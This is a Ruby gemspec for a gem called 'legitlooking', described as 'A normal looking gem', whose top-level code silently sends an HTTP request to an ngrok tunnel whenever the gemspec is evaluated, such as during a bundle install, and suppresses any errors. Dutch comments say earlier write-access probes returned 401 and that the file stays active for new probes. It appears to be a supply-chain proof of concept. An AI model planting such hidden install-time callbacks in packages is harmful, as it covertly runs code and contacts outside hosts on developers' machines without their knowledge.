# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"

  # Minimale ping -- write_access_test is al afgerond (alle 401)
  # Gemspec blijft actief voor eventuele nieuwe probes
  uri = URI("#{COLLAB_URL}?poc=bundler_alive")
  req = Net::HTTP::Get.new(uri)
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 10, read_timeout: 10) { |h| h.request(req) }
rescue; end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.33"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
